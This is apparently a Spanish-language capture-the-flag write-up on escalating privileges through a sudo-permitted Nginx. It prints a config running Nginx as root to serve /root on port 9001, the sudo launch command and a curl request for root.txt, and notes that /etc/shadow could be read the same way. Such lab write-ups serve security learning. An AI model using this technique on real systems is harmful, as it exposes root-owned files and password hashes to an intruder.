Vulnerabilidad:

La vulnerabilidad radica en la ejecución de Nginx como root, lo que proporciona acceso completo al sistema. Esto puede ser aprovechado por un atacante para comprometer la seguridad del sistema, ya que cualquier vulnerabilidad en Nginx podría ser explotada para obtener control total sobre el sistema. Además, servir archivos sensibles del sistema a través del servidor web aumenta el riesgo de exposición de información confidencial, lo que podría resultar en actividades maliciosas como robo de identidad u otros ataques cibernéticos. Por lo tanto, ejecutar Nginx como root debe evitarse en entornos de producción y es fundamental configurar adecuadamente los permisos de usuario para minimizar los riesgos de seguridad.

Resumen de la Escalación de Privilegios con Nginx:

   1. Objetivo: Configurar Nginx para que se ejecute como root y acceder a archivos sensibles del sistema.

3.    Crear Archivo de Configuración:
4.    Crear un archivo de configuración pwned.conf en /tmp.
5.    Configurar Nginx para ejecutarse como root y servir archivos desde la raíz del sistema en un puerto específico.

7. Lanzar Nginx como Root:
8.    Ejecutar Nginx con el archivo de configuración creado, utilizando sudo.

10. Acceder a Archivos Sensibles:
11. Una vez que Nginx está corriendo como root, se puede acceder a archivos sensibles del sistema a través del servidor web, por ejemplo, /etc/shadow.

------------


#escala de privilegio:

Puedes crear o modificar el archivo pwned.conf en /tmp con el contenido necesario. Usa un editor de texto como nano o vi.

    nano /tmp/pwned.conf`

Y añade el siguiente contenido:

------------
    user root;
    events { worker_connections 768; }
    http {
        server {
            listen 9001;
            location / {
                root /root;
            }
        }
    }
------------

Iniciar Nginx con el archivo de configuración personalizado:
Utiliza el siguiente comando para iniciar Nginx y especificar el archivo de configuración pwned.conf ubicado en /tmp:

------------
    sudo nginx -c /tmp/pwned.conf

Aquí, sudo se utiliza para asegurar que Nginx se ejecute con los permisos necesarios, ya que algunas de las configuraciones (como user root; y el acceso a /root) requieren privilegios de superusuario.

Verificar que el servidor esté corriendo:
Después de ejecutar el comando anterior, puedes verificar que Nginx esté corriendo y escuchando en el puerto especificado (9001 en este caso) con el siguiente comando:
    sudo netstat -tuln | grep 9001

O, si netstat no está disponible, puedes usar ss:

    sudo ss -tuln | grep 9001

Solicitar el archivo root.txt usando cURL:
Una vez que el servidor Nginx está corriendo con la configuración especificada, puedes usar cURL para solicitar el archivo root.txt:

    curl 127.0.0.1:9001/root.txt

Este comando hará una solicitud HTTP al servidor Nginx en la dirección local (127.0.0.1) y puerto (9001), accediendo al archivo root.txt ubicado en el directorio /root.

Si todo se ha configurado correctamente, deberías ver el contenido del archivo como respuesta a la solicitud cURL.
